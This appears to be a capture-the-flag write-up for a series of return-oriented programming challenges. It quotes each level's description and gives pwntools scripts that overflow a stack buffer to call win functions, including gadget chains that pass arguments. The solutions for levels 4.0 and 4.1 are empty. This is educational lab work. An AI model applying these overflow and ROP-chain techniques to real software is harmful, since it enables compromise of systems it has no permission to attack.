<div align="center">
    <h1> Return Oriented Programming </h1> 
</div>

### Level 1.0 - Overwrite a return address to trigger a win function!

```bash
This challenge reads in some bytes, overflows its stack, and allows you to perform a ROP attack. Through this series of
challenges, you will become painfully familiar with the concept of Return Oriented Programming!

In this challenge, there is a win() function.
win() will open the flag and send its data to stdout; it is at 0x4026f8.
In order to get the flag, you will need to call this function.

You can call a function by directly overflowing into the saved return address,
which is stored at 0x7ffcdea1c8c8, 72 bytes after the start of your input buffer.
That means that you will need to input at least 80 bytes (51 to fill the buffer,
21 to fill other stuff stored between the buffer and the return address,
and 8 that will overwrite the return address).
```

```python
from pwn import *
import warnings
warnings.filterwarnings('ignore')
context.log_level = 'critical'

fname = '/challenge/babyrop_level1.0'

r = process(fname)
e = ELF(fname)

r.sendline(b'w3th4nds'*9 + p64(e.sym.win))

print(r.recvline_contains(b'pwn').decode())
```

### Level 1.1 - Overwrite a return address to trigger a win function!

```python
from pwn import *
import warnings
warnings.filterwarnings('ignore')
context.log_level = 'critical'

fname = '/challenge/babyrop_level1.1'

r = process(fname)
e = ELF(fname)

r.sendline(b'w3th4nds'*13 + p64(e.sym.win))

print(r.recvline_contains(b'pwn').decode())
```

### Level 2.0 - Use ROP to trigger a two-stage win function!

```bash
In this challenge, there are 2 stages of win functions. The functions are labeled `win_stage_1` through `win_stage_2`.
In order to get the flag, you will need to call all of these stages in order.

You can call a function by directly overflowing into the saved return address,
which is stored at 0x7ffc8aa5fdf8, 104 bytes after the start of your input buffer.
That means that you will need to input at least 112 bytes (82 to fill the buffer,
22 to fill other stuff stored between the buffer and the return address,
and 8 that will overwrite the return address).
```

```python
from pwn import *
import warnings
warnings.filterwarnings('ignore')
context.log_level = 'critical'

fname = '/challenge/babyrop_level2.0'

r = process(fname)
e = ELF(fname)

r.sendline(b'w3th4nds'*13 + p64(e.sym.win_stage_1) + p64(e.sym.win_stage_2))

print(r.recvline_contains(b'pwn').decode())
```

### Level 2.1 - Use ROP to trigger a two-stage win function!

```python
from pwn import *
import warnings
warnings.filterwarnings('ignore')
context.log_level = 'critical'

fname = '/challenge/babyrop_level2.1'

r = process(fname)
e = ELF(fname)

r.sendline(b'w3th4nds'*5 + p64(e.sym.win_stage_1) + p64(e.sym.win_stage_2))

print(r.recvline_contains(b'pwn').decode())
```

### Level 3.0 - Use ROP to trigger a multi-stage win function!

```bash
This challenge reads in some bytes, overflows its stack, and allows you to perform a ROP attack. Through this series of
challenges, you will become painfully familiar with the concept of Return Oriented Programming!

In this challenge, there are 5 stages of win functions. The functions are labeled `win_stage_1` through `win_stage_5`.
In order to get the flag, you will need to call all of these stages in order.

In addition to calling each function in the right order, you must also pass an argument to each of them! The argument
you pass will be the stage number. For instance, `win_stage_1(1)`.

You can call a function by directly overflowing into the saved return address,
which is stored at 0x7ffce9f2dbc8, 120 bytes after the start of your input buffer.
That means that you will need to input at least 128 bytes (101 to fill the buffer,
19 to fill other stuff stored between the buffer and the return address,
and 8 that will overwrite the return address).
```

```python
from pwn import *
import warnings
warnings.filterwarnings('ignore')
context.log_level = 'critical'

fname = '/challenge/babyrop_level3.0'

r = process(fname)
e = ELF(fname)
rop = ROP(e)

pop_rdi = p64(rop.find_gadget(['pop rdi'])[0])

r.sendline(flat({
    120: pop_rdi + p64(1) + p64(e.sym.win_stage_1) +
         pop_rdi + p64(2) + p64(e.sym.win_stage_2) +
         pop_rdi + p64(3) + p64(e.sym.win_stage_3) +
         pop_rdi + p64(4) + p64(e.sym.win_stage_4) +
         pop_rdi + p64(5) + p64(e.sym.win_stage_5)
}))

print(r.recvline_contains(b'pwn').decode())
```

### Level 3.1 - Use ROP to trigger a multi-stage win function!

```python
from pwn import *
import warnings
warnings.filterwarnings('ignore')
context.log_level = 'critical'

fname = '/challenge/babyrop_level3.1'

r = process(fname)
e = ELF(fname)
rop = ROP(e)

pop_rdi = p64(rop.find_gadget(['pop rdi'])[0])

r.sendline(flat({
    40:  pop_rdi + p64(1) + p64(e.sym.win_stage_1) +
         pop_rdi + p64(2) + p64(e.sym.win_stage_2) +
         pop_rdi + p64(3) + p64(e.sym.win_stage_3) +
         pop_rdi + p64(4) + p64(e.sym.win_stage_4) +
         pop_rdi + p64(5) + p64(e.sym.win_stage_5)
}))

print(r.recvline_contains(b'pwn').decode())
```

### Level 4.0 - Leverage a stack leak while crafting a ROP chain to obtain the flag!

```bash
ASLR means that the address of the stack is not known,
but I will simulate a memory disclosure of it.
By knowing where the stack is, you can now reference data
that you write onto the stack.
Be careful: this data could trip up your ROP chain,
because it could be interpreted as return addresses.
You can use gadgets that shift the stack appropriately to avoid that.
[LEAK] Your input buffer is located at: 0x7ffc065897b0.
```

```python

```

### Level 4.1 - Leverage a stack leak while crafting a ROP chain to obtain the flag!

```python

```